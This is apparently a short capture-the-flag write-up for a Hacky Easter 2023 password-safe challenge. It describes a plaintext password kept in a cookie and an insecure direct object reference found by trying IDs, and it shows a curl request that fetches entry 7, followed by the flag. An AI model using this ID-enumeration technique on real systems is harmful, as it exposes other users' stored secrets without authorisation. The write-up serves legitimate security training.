You can create an account and store passwords in the safe.
When using the remindMe option, it seems to be adding a cookie which contains your plaintext password, which looks quite fishy.

You seem to be able to fetch certain passwords if you create certain passwords.
And you also seem to be able to fetch other passwords.

After trying multiple IDs, 7 seems to be the lucky number.

```
curl 'http://ch.hackyeaster.com:2312/get/7' \  
 -H 'Accept: */*' \  
 -H 'Accept-Language: en-GB,en;q=0.9,nl-BE;q=0.8,nl;q=0.7,en-US;q=0.6' \  
 -H 'Cache-Control: no-cache' \  
 -H 'Connection: keep-alive' \  
 -H 'Cookie: session=.eJwlzjkOAjEMAMC_pKaIHTtx9jOr-BK0e1SIv4PEvGDeZc8jzmfZruOOR9lfXrZi4ZyYOJitIs3ep6FOSAwgtSaETfqAruK103SazXKMJmBq6plhonU1Ym_Jo-Mw6JXMGyGEO_KaqoGQmgAmlZabIE9Zy0jKL3Kfcfw3V5xX-XwBT2kxKw.ZE2A9A.PTqT1YDr4vxuOOtioKsIK8pOf6Q  
' \  
 -H 'Pragma: no-cache' \  
 -H 'Referer: http://ch.hackyeaster.com:2312/show' \  
 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' \  
 -H 'X-Requested-With: XMLHttpRequest' \  
 --compressed \  
 --insecure
```

he2023{1d0R_c4n_d3str0y_ur_Crypt0_3ff0rt}

